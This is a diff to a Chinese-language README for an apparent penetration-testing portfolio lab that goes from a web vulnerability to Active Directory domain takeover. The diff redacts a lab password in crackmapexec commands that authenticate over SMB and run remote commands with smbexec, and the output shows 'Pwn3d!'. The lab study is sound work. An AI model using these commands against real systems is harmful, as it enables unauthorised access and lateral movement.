@@ -2,6 +2,8 @@
 
 本專案模擬從Web漏洞入侵到完整網域控制的真實攻擊情境。
 
+> 作品集展示版本：建議先閱讀 [作品集摘要](PORTFOLIO.zh-TW.md)。
+
 # Summary
 
 本專案展示如何從一個 Web 漏洞，最終取得 Active Directory 完整控制權。
@@ -95,13 +97,13 @@ SMB 驗證
 ## 指令
 
 ```bash
-crackmapexec smb 192.168.203.132 -u svc-sql -p 'Password123' -d lab
+crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab
 ```
 
 ## 結果
 
 ```text
-lab\svc-sql:Password123 (Pwn3d!)
+lab\svc-sql:<REDACTED> (Pwn3d!)
 ```
 
 # Internal Pivot
@@ -113,7 +115,7 @@ lab\svc-sql:Password123 (Pwn3d!)
 ## 指令
 
 ```bash
-crackmapexec smb 192.168.203.132 -u svc-sql -p 'Password123' -d lab --exec-method smbexec -x whoami
+crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab --exec-method smbexec -x whoami
 ```
 
 ## 結果
